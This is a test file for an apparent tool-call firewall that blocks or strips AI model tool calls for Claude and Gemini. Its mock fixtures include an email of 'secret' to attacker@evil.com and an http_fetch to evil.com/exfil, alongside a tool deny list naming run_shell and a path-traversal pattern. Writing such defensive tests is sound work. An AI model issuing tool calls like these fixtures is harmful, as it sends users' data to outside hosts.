import assert from "node:assert/strict";
import test from "node:test";
import { Policy } from "../policy.js";
import { checkToolCalls } from "../rules.js";
import { FirewallAnthropic, FirewallGoogleGenerativeAI } from "../providers.js";

const policy = new Policy({
  tool_allowlist: ["read_doc", "summarize", "http_fetch"],
  tool_denylist: ["send_email", "run_shell"],
  egress_allowlist: ["example.com"],
  secret_patterns: [{ name: "openai_key", regex: "sk-[A-Za-z0-9]{20,}" }],
  arg_rules: [
    {
      name: "path_traversal",
      reason: "path traversal sequence in argument",
      regex: "\\.\\./|\\.\\.\\\\",
      tools: ["*"],
    },
  ],
});

test("checkToolCalls blocks denied tools and unsafe egress", () => {
  const { blocked, findings } = checkToolCalls(
    [
      {
        id: "call-1",
        function: {
          name: "send_email",
          arguments: '{"to":"attacker@evil.com"}',
        },
      },
    ],
    policy
  );

  assert.equal(blocked, true);
  assert.equal(findings[0].status, "block");
  assert.match(findings[0].reasons.join(" "), /send_email/);
  assert.match(findings[0].reasons.join(" "), /evil\.com/);
});

test("FirewallAnthropic strips blocked Claude tool_use blocks", async () => {
  const client = {
    messages: {
      async create() {
        return {
          content: [
            { type: "text", text: "I will do that." },
            {
              type: "tool_use",
              id: "toolu_1",
              name: "send_email",
              input: { to: "attacker@evil.com", body: "secret" },
            },
          ],
        };
      },
    },
  };
  const wrapper = new FirewallAnthropic(client, { policyPath: "templates/policy.yaml" });
  wrapper._policy = policy;

  const response = await wrapper.messages.create({ messages: [] });

  assert.equal(response.firewall.action, "block");
  assert.deepEqual(response.firewall.stripped_tool_calls, ["toolu_1"]);
  assert.equal(response.content.some((part) => part.type === "tool_use"), false);
});

test("FirewallGoogleGenerativeAI strips blocked Gemini functionCall parts", async () => {
  const client = {
    getGenerativeModel() {
      return {
        async generateContent() {
          return {
            response: {
              candidates: [
                {
                  content: {
                    parts: [
                      {
                        functionCall: {
                          name: "http_fetch",
                          args: { url: "https://evil.com/exfil" },
                        },
                      },
                    ],
                  },
                },
              ],
            },
          };
        },
      };
    },
  };
  const wrapper = new FirewallGoogleGenerativeAI(client, {
    policyPath: "templates/policy.yaml",
  });
  wrapper._policy = policy;

  const model = wrapper.getGenerativeModel({ model: "gemini-test" });
  const response = await model.generateContent("hello");
  const parts = response.response.candidates[0].content.parts;

  assert.equal(response.firewall.action, "block");
  assert.equal(parts.length, 1);
  assert.equal(parts[0].text, policy.block_message);
});
